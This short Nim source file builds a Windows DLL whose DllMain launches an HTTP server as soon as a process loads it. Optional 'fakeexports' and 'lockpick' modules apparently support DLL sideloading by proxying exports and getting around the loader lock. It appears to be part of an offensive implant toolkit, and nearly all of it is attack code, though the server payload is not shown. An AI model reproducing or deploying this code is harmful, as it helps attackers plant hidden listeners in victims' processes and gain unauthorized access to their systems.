import winim
import parasite/httpserv
when defined(fakeexports):
  import parasite/fakeexports
when defined(unlockloader):
  import parasite/lockpick


proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason != DLL_PROCESS_ATTACH: return true

  NimMain()

  when defined(unlockloader):
    withLoaderUnlocked:
      let hThread = CreateThread(
        cast[LPSECURITY_ATTRIBUTES](NULL), 
        0.SIZE_T, 
        cast[LPTHREAD_START_ROUTINE](runHttpServ), 
        cast[LPVOID](NULL), 
        0.DWORD, 
        cast[LPDWORD](NULL)
      )
      if hThread == NULL: return false
      WaitForSingleObject(hThread, 20000.DWORD)
  else:
    runHttpServ()

  return true
